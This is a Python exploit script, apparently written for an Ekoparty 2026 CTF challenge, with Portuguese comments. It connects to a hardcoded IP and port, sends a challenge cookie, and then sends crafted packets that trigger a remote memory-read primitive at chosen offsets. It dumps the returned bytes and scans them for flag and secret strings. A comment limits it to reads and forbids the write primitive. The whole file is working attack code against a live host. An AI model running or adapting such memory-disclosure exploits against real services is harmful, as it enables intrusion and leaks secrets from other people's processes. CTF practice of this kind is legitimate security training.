#!/usr/bin/env python3
# RPM estendido (flag=1) alem de 0x13000 — procura regiao mapeada fora da imagem da DLL (flag2).
# Aprovado: SO leitura (flag=1). NAO fazer WPM (flag=2) aqui.
# Uso: python3 rpm_extended.py <cooldown> <off1,off2,...hex> [len_hex]
import socket, struct, re, sys, time
HOST, PORT = "63.183.92.113", 20269
COOKIE = b"Ekoparty 2026 - Binary Gecko CTF challenge"
HEALTHY = b"Welcome to this CTF\x00"
HIK = re.compile(rb'HIK_[\x20-\x7e]{4,300}')
FLAGSTR = re.compile(rb'FLAG')

def rd(s,n,to=8.0):
    s.settimeout(to); b=b""
    try:
        while len(b)<n:
            c=s.recv(n-len(b))
            if not c: break
            b+=c
    except (socket.timeout,ConnectionResetError,OSError): pass
    return b

def main(cooldown, offsets, length):
    if cooldown>0:
        print(f"[*] cooldown {cooldown}s..."); time.sleep(cooldown)
    try:
        s=socket.create_connection((HOST,PORT),timeout=8); s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
    except Exception as e: print("CONNECT FAIL:",e); return
    s.sendall(COOKIE)
    banner=rd(s,20)
    print("banner:",banner.hex(), "OK" if banner==HEALTHY else "<<DEGRADADO/retry>>")
    if banner!=HEALTHY: s.close(); return
    for off in offsets:
        s.sendall(struct.pack("<IBII",0xd,1,off,length))
        r=rd(s,length)
        asc=''.join(chr(x) if 32<=x<127 else '.' for x in r)
        print(f"  counter=0x{off:x} len=0x{length:x} -> {len(r)}B {r.hex()[:40]} | {asc[:40]}")
        if len(r)==0:
            print(f"    >>> FECHOU em counter=0x{off:x} (nao-mapeado ou erro). chain morto."); break
        m=HIK.search(r)
        if m: print(f"    >>> HIK: {m.group().decode(errors='replace')}")
        m2=FLAGSTR.search(r)
        if m2: print(f"    >>> 'FLAG' string found at rel offset {m2.start()}")
    s.close()

if __name__=="__main__":
    cooldown=int(sys.argv[1])
    offsets=[int(x,16) for x in sys.argv[2].split(",")]
    length=int(sys.argv[3],16) if len(sys.argv)>3 else 0x40
    main(cooldown, offsets, length)
